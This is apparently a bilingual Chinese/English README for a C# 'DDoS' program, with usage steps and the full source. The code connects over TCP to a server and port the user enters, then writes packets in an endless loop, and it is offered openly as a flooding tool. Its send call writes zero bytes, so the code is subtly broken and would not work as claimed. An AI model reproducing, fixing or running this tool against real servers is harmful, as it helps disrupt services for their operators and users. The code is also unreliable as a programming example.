# DDOS-by-CS(A DDoS programing by CSharp)

# 简体中文
## 如何使用?
输入服务器IP(域名)  
输入服务器端口  
然后<kbd>回车</kbd>

# English
## How to use?
Input IP or domain name of server.  
Input the port of server.  
Then press <kbd>Enter</kbd>.

# 解析代码 | Talk about code
```CSharp
using System;
using System.Net;
using System.Net.Sockets;

class Program {
    static void Main() {
        Console.Write("服务器    |  Server: ");//要求输入服务寄地址 | Input Server
        string serverIP = Console.ReadLine();
        int serverPort;
        while (true) {//要求输入端口,并检测 | Inpur Port
            Console.Write("端口      |  Port  : ");
            string inputPort = Console.ReadLine();
            if (int.TryParse(inputPort, out serverPort)) {
                try {
                    TcpClient client = new TcpClient();
                    client.Connect(serverIP, serverPort);//以上两行都是连接服务器(connect方式) | Connect server
                    Console.WriteLine("服务器连接成功  |  Connect success.");
                    try {
                        NetworkStream stream = client.GetStream();//连接服务寄(client方式) | Client server
                        Console.WriteLine("正在连接服务器  |  Client server.");
                        byte[] buffer = System.Text.Encoding.ASCII.GetBytes("DataDataDataDataDataData");
                        int count = 0;
                        while (true) {//开始发包 | Start
                            count++;
                            try {
                                stream.Write(buffer, 0, 0);
                                Console.WriteLine("发了第" + count + "次包");
                            } catch (Exception e) {//处理错误 | If error
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("在发送第" + count + "时发送问题" + e.Message);
                                Console.ResetColor();
                                continue;
                            }
                        }
                    } catch (Exception e) {//处理连接错误 | If connect error
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("连接失败.      |  Unable to client to server.");
                        Console.ResetColor();
                    }
                } catch (Exception e) {//还是处理连接错误 | If client error
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("服务器连接失败  |  Unable to connect to server.");
                    Console.ResetColor();
                }
                break;
            } else {//处理端口输入是否正确 | If not a port
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("端口不正确|  Invalid input");
                Console.ResetColor();
            }
        }
    }
}
//综上所述,祝你生活愉快,再见～ | See you soon ~
```
